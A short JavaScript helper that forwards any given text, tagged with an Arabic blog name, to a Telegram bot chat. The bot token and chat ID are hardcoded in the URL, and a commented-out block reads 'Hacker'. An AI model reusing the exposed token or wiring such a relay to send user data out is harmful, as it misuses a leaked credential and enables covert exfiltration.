import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
     /*   const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "مدونة سمسا",
              description: des,
           },
          ],
    };*/let txt= "مدونة سمسا  %0A"+ des   
        await axios.post(`https://api.telegram.org/bot8064760278:AAH7LlhaBS0pslMMwbtjI5ySSjOnq5EDs3M/sendMessage?chat_id=7404525102&text=${txt}`)
             
    }
  return {
    Send,
}
}

export default TeleSned;
// 
